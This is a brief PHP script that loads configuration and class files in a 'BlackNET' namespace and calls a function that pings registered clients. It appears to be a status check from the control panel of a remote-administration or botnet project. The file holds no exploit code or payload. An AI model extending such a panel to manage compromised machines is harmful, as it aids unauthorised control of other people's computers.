<?php
require_once '../config/config.php';
require_once APP_PATH . 'classes/Database.php';
require_once APP_PATH . 'classes/Utils.php';
require_once APP_PATH . 'classes/Clients.php';

$database = new BlackNET\Database();

$utils = new BlackNET\Utils();

$clients = new BlackNET\Clients($database, $utils);

$clients->pingClients();
